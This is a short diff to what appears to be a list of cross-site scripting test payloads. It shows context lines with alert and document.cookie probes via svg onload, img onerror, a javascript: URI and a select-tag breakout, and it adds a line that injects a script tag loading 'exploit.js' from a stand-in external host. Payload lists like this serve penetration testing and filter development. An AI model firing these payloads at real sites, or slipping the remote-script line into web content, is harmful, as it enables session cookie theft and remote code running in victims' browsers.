@@ -24,7 +24,7 @@ https://tweetedtimes.com/v/1939
 "><svg onload=alert(1)>
 #"><img src=/ onerror=alert(document.cookie)>
 <img src=1 onerror=alert(1)>
-
+"><script src=//www.example.com/exploit.js></script>
 javascript:alert(document.cookie)
 storeId=</option></select><script>alert(1)</script>
 
